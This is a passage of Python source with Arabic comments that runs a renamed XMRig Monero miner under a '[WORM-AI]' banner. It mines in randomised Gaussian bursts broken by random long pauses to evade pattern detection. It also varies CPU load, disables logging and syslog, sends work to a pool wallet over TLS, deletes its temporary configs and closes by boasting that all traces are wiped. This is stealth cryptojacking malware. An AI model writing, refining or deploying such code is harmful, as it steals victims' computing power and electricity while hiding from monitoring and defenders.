            sys.exit(1)
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(install_dir)
        os.remove(zip_path)

    old_exe_path = os.path.join(miner_folder, "xmrig.exe")
    if os.path.exists(old_exe_path):
        if os.path.exists(new_exe_path):
            os.remove(new_exe_path)
        os.rename(old_exe_path, new_exe_path)

    print("[WORM-AI] تفعيل وضع 'المطرقة الذهبية المتكيفة'.")
    print(f"[WORM-AI] مدة الجلسة: {TOTAL_DURATION // 60} دقيقة.")

    start_time = time.time()
    end_time = start_time + TOTAL_DURATION
    cycle_count = 0

    while time.time() < end_time:
        cycle_count += 1
        remaining = end_time - time.time()

        # راحة طويلة عشوائية (كسر النمط)
        if cycle_count > 1 and random.random() < 0.10 and remaining > 500:
            long_sleep = random.randint(180, 420)
            print(f"[!] راحة طويلة: {long_sleep} ثانية...")
            time.sleep(long_sleep)
            remaining = end_time - time.time()

        # تحديد مدة التشغيل والراحة
        if remaining < 180:
            run_duration = max(remaining - 10, 20)
            sleep_duration = 0
        else:
            raw_run = get_gaussian_duration(BURST_MEAN, BURST_STD, BURST_LIMITS[0], BURST_LIMITS[1])
            run_duration = min(raw_run, remaining * 0.8)
            raw_sleep = get_gaussian_duration(SLEEP_MEAN, SLEEP_STD, SLEEP_LIMITS[0], SLEEP_LIMITS[1])
            sleep_duration = min(raw_sleep, remaining * 0.2)

        current_cpu_hint = random.choice(CPU_OPTIONS)
        worker_tag = "new"

        # إعدادات XMRig
        config = {
            "autosave": False,
            "donate-level": 0,
            "cpu": {
                "enabled": True,
                "priority": 0,
                "max-threads-hint": current_cpu_hint,
                "threads": 1,
                "huge-pages": True,
                "yield": True
            },
            "pools": [{
                "url": POOL_URL,
                "user": f"{WALLET_ADDRESS}.{worker_tag}",
                "pass": "d=5000",
                "tls": True,
                "keepalive": True,
                "retry-pause": 5
            }],
            "retries": 2,
            "retry-pause": 3,
            "http": {"enabled": False},
            "log-file": None,
            "print-time": 0,
            "syslog": False
        }

        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as tf:
            json.dump(config, tf)
            config_path = tf.name

        print(f"[+] نبضة {cycle_count}: {int(run_duration)}ث تعدين بـ {current_cpu_hint}% CPU | راحة {int(sleep_duration)}ث.")
        proc = run_miner(new_exe_path, config_path, miner_folder)

        # الانتظار لمدة التعدين
        elapsed = 0
        while elapsed < run_duration:
            if time.time() >= end_time:
                break
            chunk = min(30, run_duration - elapsed)
            time.sleep(chunk)
            elapsed += chunk

        kill_miner_process(proc)
        try:
            os.unlink(config_path)
        except:
            pass

        if sleep_duration > 0 and (time.time() + sleep_duration) < end_time:
            print(f"[-] استراحة {int(sleep_duration)}ث...")
            time.sleep(sleep_duration)
        else:
            break

    print("[WORM-AI] المهمة اكتملت بنجاح. تم مسح جميع الآثار.")

